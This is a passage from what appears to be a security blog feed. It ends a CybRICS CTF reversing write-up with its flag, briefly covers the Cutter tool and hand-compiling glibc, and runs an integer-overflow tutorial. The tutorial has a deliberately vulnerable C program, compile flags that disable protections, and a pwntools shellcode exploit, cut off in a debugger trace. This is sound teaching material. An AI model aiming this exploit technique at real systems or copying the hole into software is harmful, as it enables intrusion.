punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayOfByte2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Then you can know the <code>data.bin</code> is actually encodedâ€¦ So how to decode it and get the <code>stage2.bin</code>?</p><p>Obviously, the value of â€œuser.nameâ€ is the keyâ€¦Make sure it is the property of challenge environmentï¼Œnot our computerâ€™s â€œuser.nameâ€â€¦</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//...Ellipsis</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    String username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">,</span><span class="token string">"matreha!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span></code></pre><p>Then compile the program and run itâ€¦</p><h2 id="Step2-Golang-analysis"><a href="#Step2-Golang-analysis" class="headerlink" title="Step2: Golang analysis"></a>Step2: Golang analysis</h2><p>You have got the <code>stage2.bin</code> from step1.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722154552.png" alt=""></p><p>According to the combination of static analysis and dynamic analysis, we can know the program logic as followsï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722205942.png" alt=""></p><p>It should be noted that when XOR reaches the last byte, the loop produces some differences, and it is easy to ignore the key of the last byte, but this byte can be inferredâ€¦â€¦</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722210542.png" alt=""></p><p>Dynamically debuggingï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211126.png" alt=""></p><p>The R8 stores the key byte that we should getâ€¦RSI stores our directory stringâ€¦There is seventeen key bytes totallyâ€¦After getting all the key bytes, just xor it with the Built-in ciphertextâ€¦</p><p><code>Built-in ciphertext(hex)</code>:0x53ddc587e46399144fa4142dc42404c0b0</p><p><code>Key(hex)</code>:0x38afaaf48c08f84b22c5605fa1576cabd1</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2sIn <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> n2s<span class="token punctuation">(</span><span class="token number">0x53ddc587e46399144fa4142dc42404c0b0</span><span class="token operator">^</span><span class="token number">0x38afaaf48c08f84b22c5605fa1576cabd1</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'kroshka_matreshka'</span></code></pre><p>Then i mv the program in a directory named â€˜kroshka_matreshkaâ€™ and run itâ€¦A result.pycâ€¦wellğŸ˜</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211935.png" class="lazyload"></p><p>Apparentlyï¼Œwe arrived hereï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211827.png" class="lazyload"></p><h2 id="Step3ï¼šPython-analysis"><a href="#Step3ï¼šPython-analysis" class="headerlink" title="Step3ï¼šPython analysis"></a>Step3ï¼šPython analysis</h2><p>Decompiling <code>result.pyc</code>, then you can see the logic from source codeâ€¦This is an eight-byte key cycle XOR encryption algorithm.</p><p>You have known the flag is begin with <code>cybrics{</code>ï¼Œso you can directly get the keyï¼š<code>Kr0H4137</code>ï¼Œthen you just get flag by decrypting the ciphertextâ€¦ğŸ†—</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> result <span class="token keyword">import</span> <span class="token operator">*</span>Enter key to get flag<span class="token punctuation">:</span>Kr0H4137cybrics<span class="token punctuation">{</span>M4TR35HK4_15_B35T<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span></code></pre><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>Itâ€™s a nice and full day!ğŸ˜„</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Awesome_Cutter_radare2</title>
      <link href="/2019/07/21/Awesome-Cutter-radare2/"/>
      <url>/2019/07/21/Awesome-Cutter-radare2/</url>
      
        <content type="html"><![CDATA[<p>Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineersğŸ˜.</p><a id="more"></a><p>Github repository link: <a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p>Instruction doc linkï¼š<a href="https://cutter.re/docs/" target="_blank" rel="noopener">https://cutter.re/docs/</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190721170055.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Compile_Glibc_Manually</title>
      <link href="/2019/07/20/Manually-Compile-Glibc/"/>
      <url>/2019/07/20/Manually-Compile-Glibc/</url>
      
        <content type="html"><![CDATA[<p>If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledgeâ€¦â€¦</p> <a id="more"></a><h1 id="Compile-Glibc-Manually"><a href="#Compile-Glibc-Manually" class="headerlink" title="Compile_Glibc_Manually"></a>Compile_Glibc_Manually</h1><blockquote><p>Today i will show you how to compile a glibc manually.</p></blockquote><h2 id="What-is-Glibc"><a href="#What-is-Glibc" class="headerlink" title="What is Glibc?"></a>What is Glibc?</h2><p>Refer from the <code>stack overflow</code>:<a href="https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for" target="_blank" rel="noopener">https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for</a></p><blockquote><p>Itâ€™s the implementation of <em>Standard C library</em> described in C standards plus some extra useful stuffs which are not strictly standard but used frequently.</p><p>Its main contents are :</p><p>1) C library described in ANSI,c99,c11 standards. It includes macros, symbols, function implementations etc.(printf(),malloc() etc)</p><p>2) POSIX standard library. The â€œuserlandâ€ glue of system calls. (open(),read() etc. Actually glibc does not â€œimplementâ€ system calls. kernel does it. But glibc provides the user land interface to the services provided by kernel so that user application can use a system call just like a ordinary function.</p><p>3) Also some nonstandard but useful stuff.</p><p>â€œuse the force, read the source â€œ</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$git</span> clone git://sourceware.org/git/glibc.git</code></pre></blockquote><h2 id="What-is-ld-so"><a href="#What-is-ld-so" class="headerlink" title="What is ld.so?"></a>What is ld.so?</h2><p>ld.so : Dynamic linker of systemâ€¦Used for Executed-file like a.out</p><p>ld-linux.so: Dynamic linker of linuxâ€¦Used for ELF format Executed-file.</p><pre class=" language-bash"><code class="language-bash"> âœ˜ âš¡ root@xiaoyifeng ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file ./elf/ld-linux-x86-64.so.2</span>./elf/ld-linux-x86-64.so.2: symbolic <span class="token function">link</span> to ld.so</code></pre><h2 id="What-is-libc-so"><a href="#What-is-libc-so" class="headerlink" title="What is libc.so?"></a>What is libc.so?</h2><p>libc.so : Glibc binary is called libc.so.6</p><p>Actually libc.so.6 is a symbolic link to libc.soâ€¦â€¦ </p><pre class=" language-bash"><code class="language-bash"> âš¡ root@xiaoyifeng î‚° ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file libc.so.6</span>libc.so.6: symbolic <span class="token function">link</span> to libc.so</code></pre><p><a href="https://stackoverflow.com/questions/11372872/what-is-the-role-of-libcglibc-in-our-linux-app" target="_blank" rel="noopener">What is libc?</a></p><h2 id="Compiling-it"><a href="#Compiling-it" class="headerlink" title="Compiling it!"></a>Compiling it!</h2><blockquote><p>Reference:<a href="https://www.jianshu.com/p/ee1ad4044ef7" target="_blank" rel="noopener">https://www.jianshu.com/p/ee1ad4044ef7</a></p></blockquote><p>Before compile itï¼Œyou should download the special glibc source code and uncompressed itâ€¦â€¦Then you should mkdir two another directory called for build and compiling fileâ€¦â€¦like this:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720155219.png" alt=""></p><h3 id="Step1-configure"><a href="#Step1-configure" class="headerlink" title="Step1:configure"></a>Step1:configure</h3><p>Itâ€™s important to add <code>--disable-werror</code>â€¦â€¦</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720152708.png" alt=""></p><h3 id="Step2-make"><a href="#Step2-make" class="headerlink" title="Step2: make"></a>Step2: make</h3><p>Maybe you would encounter this bad problem. : <code>can&#39;t be versioned to common symbol &#39;loc1&#39;</code></p><p>Just find the solution in this page : <a href="https://www.e-learn.cn/content/qita/664508" target="_blank" rel="noopener">https://www.e-learn.cn/content/qita/664508</a></p><pre class=" language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">14</span> <span class="token operator">+</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">15</span> @@ <span class="token macro property">#<span class="token directive keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><span class="token operator">-</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1<span class="token punctuation">;</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  Avoid .symver on common+   symbol, which just creates a new common symbol, not an alias.  */</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Although we do not support the use we define this variable as well.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>locs<span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>locs <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Just add <code>__attribute__ ((nocommon))</code> behind the <code>*loc</code>ï¼Œthen you can solve this error;</p><h3 id="step3-make-install"><a href="#step3-make-install" class="headerlink" title="step3: make install"></a>step3: make install</h3><p>After <code>make install</code>, you can find the libc.so compiled by yourself in build directory, and ld.so is in elf directory.</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes:"></a>Notes:</h3><p>Although the same version of libc may also have diffrent offset because of the diffrent args in compiling time.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720154352.png" alt=""></p><h2 id="Using-The-Compiled-Glibc-To-Compile-Program"><a href="#Using-The-Compiled-Glibc-To-Compile-Program" class="headerlink" title="Using The Compiled Glibc To Compile Program"></a>Using The Compiled Glibc To Compile Program</h2><p><code>Instructions</code>:</p><pre class=" language-bash"><code class="language-bash">gcc -g -fno-stack-protector -z execstack size_over.c -o size_over -Wl,--rpath<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/ -Wl,--dynamic-linker<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/elf/ld-linux-x86-64.so.2</code></pre><p><code>compile program</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161136.png" alt=""></p><p><code>libs infomation</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161116.png" alt=""></p><p><code>Use gdb to debug in underlying source level</code>ï¼š</p><p>reference: <a href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb" target="_blank" rel="noopener">https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161923.png" class="lazyload"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>So cool it isğŸ˜„!</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Compile </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Integer_Overflow</title>
      <link href="/2019/07/19/Integer-Overflow/"/>
      <url>/2019/07/19/Integer-Overflow/</url>
      
        <content type="html"><![CDATA[<p>Buffer overflow triggered by integer overflowâ˜•â€¦â€¦</p><a id="more"></a><p>[TOC]</p><h1 id="Integer-Overflow"><a href="#Integer-Overflow" class="headerlink" title="Integer_Overflow"></a>Integer_Overflow</h1><blockquote><p>I have learned the <code>size_t ==&gt; unsigned char</code> integer overflowğŸ™ƒâ€¦</p></blockquote><h2 id="Example-Source-Code"><a href="#Example-Source-Code" class="headerlink" title="Example Source Code"></a>Example Source Code</h2><p><code>Instructions to compile:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_spacegcc -g -fno-stack-protector -z execstack size_over.c -o size_over</code></pre><p><code>size_over.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">validate_msg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span><span class="token keyword">int</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> msg_buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> msg_len <span class="token operator">=</span> msg_size<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+]msg_len:%d \n"</span><span class="token punctuation">,</span>msg_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_len <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> msg_len <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>msg_buf<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    size_t msg_size<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%s\n",payload);</span>    <span class="token function">validate_msg</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-script"><a href="#Exploit-script" class="headerlink" title="Exploit script"></a>Exploit script</h2><blockquote><p>Here is my exploit scriptâ€¦</p><p>Maybe i should spend some time to learn Underlying libcâ€¦</p><p>From this example, we can know more about the way through overflow to execute shellcode in stack and the influence of <code>\x00</code>â€¦â€¦</p><p>Normally, execute shellcode in stack should make sure NX disabledâ€¦And hijacking program go to stack by using gadget <code>jmp esp</code>,or control Eip while knowing stack addressâ€¦</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># diffrent enviroment has diffrent address......here is test result of my computer......</span>rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token comment" spellcheck="true"># padding(12+8) + shellcode_addr(8)  </span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token string">"a"</span>payload <span class="token operator">+=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">"b"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token string">"\x90"</span>payload <span class="token operator">+=</span> shellcodepayload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./size_over'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvuntil(":")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'260\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>Running to ret2shellcode_addr</code>:</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> ni<span class="token number">0x00005555555551dc</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> REGISTERS <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RAX  <span class="token number">0x7fffffffdca4</span> â—‚â€” <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span> RBX  <span class="token 